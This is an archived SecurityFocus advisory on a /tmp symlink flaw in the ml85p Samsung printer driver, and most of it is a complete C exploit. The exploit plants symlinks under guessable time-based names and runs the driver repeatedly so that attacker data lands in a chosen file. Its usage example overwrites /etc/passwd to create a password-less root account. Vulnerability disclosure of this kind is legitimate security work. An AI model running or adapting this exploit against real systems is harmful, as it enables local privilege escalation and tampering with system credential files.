source: http://www.securityfocus.com/bid/3008/info

ml85p is a Linux driver for Samsung ML-85G series printers. It may be bundled with distributions of Ghostscript.

ml85p does not check for symbolic links when creating image output files.

These files are created in /tmp with a guessable naming format, making it trivial for attackers to exploit this vulnerability.

Since user-supplied data is written to the target file, attackers may be able to elevate privileges.

/* ml85p-xpl.c
 *
 * Quick hack to exploit ml85p
 *
 * Simply run it with the file you want to create/overwrite
 * and the data you wish to place in the file.
 *
 * Example:
 *
 * $ gcc -g -Wall ml85p-xpl.c -o ml85p-xpl
 * $ ./ml85p-xpl /etc/passwd owned::0:0::/root:/bin/bash
 *
 * Then login as owned... etc..
 *
 * by Charles Stevenson <core@ezlink.com>
 *
 * July 10 2001
 *
 * shoutz b10z
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

#include <time.h>

#define TEMPFILE "/tmp/ez.XXXXXX"
#define BRUTE 10

void usage(char*);

int main(int argc, char **argv){
   char tempfile[128] = TEMPFILE;
   int fd, i;
   time_t the_time;
   char temp[512];
   
   if (argc < 3){
      usage(argv[0]);
   }

   if((fd = mkstemp(tempfile))==-1){
      fprintf(stderr, "Error creating %s!\n",tempfile);
      exit(1);
   }

   /* begin lazy slacker coding */
   fprintf(stderr, "ml85p-xpl.c by core (c) 2001\n");
   fprintf(stderr, "> backing up %s to %s\n", argv[1], tempfile);

   /* backup old file */
   sprintf(temp, "/bin/cp %s %s", argv[1], tempfile);
   system(temp);
   
   /* set the date/time */
   sprintf(temp, "/bin/touch -r %s %s", argv[1], tempfile);
   system(temp);

   the_time = time(NULL);

   fprintf(stderr, "> creating a lot of symlinks\n");

   for (i=0;i<BRUTE;i++){
      /* BAD CODE: sprintf(gname,"/tmp/ml85g%d",time(0)); */
      sprintf(temp, "/tmp/ml85g%d", the_time+i);
      symlink(argv[1], temp);
   }

   sprintf(temp, "/bin/echo `perl -e 'print \"\\n\"'`%s > file; ml85p
-sf file 2>&1>/dev/null & sleep 1; killall ml85p\n", argv[2]);
   fprintf(stderr, "Running a few times since I'm lazy.\n");
   for (i=0;i<BRUTE;i++){
      system(temp);
      //sleep(1);
   }

   sprintf(temp, "/bin/ls -l %s", argv[1]);
   system(temp);

   fprintf(stderr, "> cleaning up\n");
   sprintf(temp, "/bin/rm -f /tmp/ml85*");
   system(temp);
   
   fprintf(stderr, "All done. Enjoy!\n");
   return 0;
}

void usage(char *name){
   
   fprintf(stderr, "usage: %s <filename> <data>\n", name);
   exit(1);
}

/* EOF */